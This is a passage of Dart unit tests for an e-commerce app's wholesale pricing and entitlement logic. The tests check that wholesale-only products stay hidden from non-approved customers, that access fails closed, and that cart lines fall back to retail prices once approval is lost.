      final double retail = WholesalePricing.retailPrice(product, vendor);
      for (final int qty in [1, 10, 50, 150, 5000]) {
        final LinePrice line = LinePrice.resolve(retail: retail, tiers: WholesalePricing.customerTiers(product, vendor), quantity: qty);
        expect(line.unit, retail, reason: '$qty units');
        expect(line.isWholesale, isFalse, reason: '$qty units');
      }
    });

    test('a wholesale-only product is HIDDEN, a mixed one is not', () {
      Constant.userModel = customer();
      expect(wholesaleOnly().hiddenForCustomer, isTrue);
      expect(wholesaleOnly().isBusinessOnlyProduct, isTrue);
      expect(mixed().hiddenForCustomer, isFalse);
      expect(retailOnly().hiddenForCustomer, isFalse);
    });

    test('the hide filter reads the RAW product, not the computed price', () {
      Constant.userModel = customer();
      final ProductModel product = wholesaleOnly();
      // This customer has no computed tiers at all, so isWholesaleOnly is
      // false FOR THEM - keying the filter on it would leak every
      // wholesale-only product to exactly the customers it hides them from.
      expect(product.isWholesaleOnly, isFalse);
      expect(product.isWholesaleOnlyProduct, isTrue);
      expect(product.rawWholesaleTiers.length, 3);
      expect(product.rawSaleType, ProductModel.saleTypeWholesale);
    });

    test('a listing is filtered BEFORE the card loop, mixed products staying', () {
      Constant.userModel = customer();
      final List<ProductModel> visible = WholesalePricing.visibleProducts([wholesaleOnly(), mixed(), retailOnly()]);
      expect(visible.length, 2);
      expect(visible.any((p) => p.isWholesaleOnlyProduct), isFalse);

      Constant.userModel = approvedBusinessCustomer();
      expect(WholesalePricing.visibleProducts([wholesaleOnly(), mixed(), retailOnly()]).length, 3);
    });

    test('an all-wholesale listing comes back EMPTY, not unfiltered', () {
      Constant.userModel = customer();
      expect(WholesalePricing.visibleProducts([wholesaleOnly(), wholesaleOnly()]), isEmpty);
    });

    test('pending and rejected buy nothing', () {
      for (final String status in ['pending', 'rejected', 'PENDING', '', 'nonsense']) {
        Constant.userModel = customer(accountType: 'business', status: status);
        expect(WholesaleEntitlement.mayBuyWholesale, isFalse, reason: 'status $status');
        expect(mixed().activeWholesaleTiers, isEmpty, reason: 'status $status');
        expect(wholesaleOnly().hiddenForCustomer, isTrue, reason: 'status $status');
      }
    });

    test('a business account with no profile at all buys nothing', () {
      Constant.userModel = customer(accountType: 'business');
      expect(WholesaleEntitlement.mayBuyWholesale, isFalse);
    });

    test('an approved profile on a PERSONAL account buys nothing', () {
      // Both halves are required: the account type is not the approval.
      Constant.userModel = customer(accountType: 'personal', status: 'approved');
      expect(WholesaleEntitlement.mayBuyWholesale, isFalse);
      Constant.userModel = customer(status: 'approved');
      expect(WholesaleEntitlement.mayBuyWholesale, isFalse);
    });

    test('it fails CLOSED: signed out, or a profile that could not be read', () {
      Constant.userModel = null;
      expect(WholesaleEntitlement.mayBuyWholesale, isFalse);
      expect(WholesaleEntitlement.isApprovedUser(null), isFalse);
      expect(mixed().activeWholesaleTiers, isEmpty);
      expect(wholesaleOnly().hiddenForCustomer, isTrue);
      // A signed-in user with no id is no better than signed out.
      Constant.userModel = UserModel()..accountType = 'business'..businessProfile = <String, dynamic>{'status': 'approved'};
      expect(WholesaleEntitlement.mayBuyWholesale, isFalse);
    });

    test('a cached lookup is read straight off the users document', () {
      expect(WholesaleEntitlement.isApprovedDocument({'accountType': 'business', 'businessProfile': {'status': 'approved'}}), isTrue);
      expect(WholesaleEntitlement.isApprovedDocument({'accountType': 'business', 'businessProfile': {'status': 'pending'}}), isFalse);
      expect(WholesaleEntitlement.isApprovedDocument({'accountType': 'business'}), isFalse);
      expect(WholesaleEntitlement.isApprovedDocument({'businessProfile': {'status': 'approved'}}), isFalse);
      expect(WholesaleEntitlement.isApprovedDocument(null), isFalse);
    });

    test('the cached answer wins for this account, and is dropped on a change', () {
      Constant.userModel = customer(accountType: 'business', status: 'pending');
      expect(WholesaleEntitlement.mayBuyWholesale, isFalse);
      // The admin approves: applying the document just read takes effect
      // without signing out.
      WholesaleEntitlement.applyDocument('u1', {'accountType': 'business', 'businessProfile': {'status': 'approved'}});
      expect(WholesaleEntitlement.mayBuyWholesale, isTrue);
      expect(WholesalePricing.customerTiers(mixed(), vendor).length, 3);
      // And a refusal afterwards is honoured just as fast.
      WholesaleEntitlement.applyDocument('u1', {'accountType': 'business', 'businessProfile': {'status': 'rejected'}});
      expect(WholesaleEntitlement.mayBuyWholesale, isFalse);
      // Dropped, so the session copy answers again.
      WholesaleEntitlement.invalidate();
      expect(WholesaleEntitlement.mayBuyWholesale, isFalse);
    });

    test('a cached answer never survives a different account', () {
      WholesaleEntitlement.applyDocument('u1', {'accountType': 'business', 'businessProfile': {'status': 'approved'}});
      Constant.userModel = customer()..id = 'someone-else';
      expect(WholesaleEntitlement.mayBuyWholesale, isFalse);
    });

    test('wholesaleBusinessOnly can only restrict further, never grant', () {
      // An approved customer: the per-product flag changes nothing, because
      // they satisfy it too.
      Constant.userModel = approvedBusinessCustomer();
      expect(mixed(businessOnly: true).activeWholesaleTiers.length, 3);
      expect(mixed(businessOnly: false).activeWholesaleTiers.length, 3);

      // An ordinary customer: false on the product does NOT open it up - the
      // blanket rule of §19 already withheld it.
      Constant.userModel = customer();
      expect(mixed(businessOnly: false).activeWholesaleTiers, isEmpty);
      expect(mixed(businessOnly: true).activeWholesaleTiers, isEmpty);
      expect(wholesaleOnly(businessOnly: false).hiddenForCustomer, isTrue);
    });

    // The cart keeps each line's tiers in a LOCAL snapshot (sqflite), taken
    // when the line was added. A customer who has since lost the approval - or
    // another account on the same phone - must still pay retail at checkout.
    test('a cart line saved with tiers charges retail once the customer is not approved', () {
      CartProductModel line(int quantity) => CartProductModel(
        id: 'p1',
        price: '4000',
        discountPrice: '0',
        quantity: quantity,
        lineMeta: CartLineMeta(tiers: clientTiers(), saleType: ProductModel.saleTypeBoth, minOrderQty: 1, fulfilment: const ['delivery', 'takeaway']),
      );

      Constant.userModel = approvedBusinessCustomer();
      expect(line(120).chargedUnitPrice, 2500);
      expect(line(120).toOrderLine().isWholesale, isTrue);

      for (final UserModel who in [customer(), customer(accountType: 'business', status: 'pending'), customer(accountType: 'personal', status: 'approved')]) {
        Constant.userModel = who;
        WholesaleEntitlement.invalidate();
        expect(line(120).activeTiers, isEmpty);
        expect(line(120).chargedUnitPrice, 4000);
        final CartProductModel written = line(500).toOrderLine();
        expect(written.price, '4000');
        expect(written.isWholesale, isFalse);
        expect(written.wholesaleMinQty, '');
      }

      Constant.userModel = null;
      expect(line(500).chargedUnitPrice, 4000);
    });
  });
}
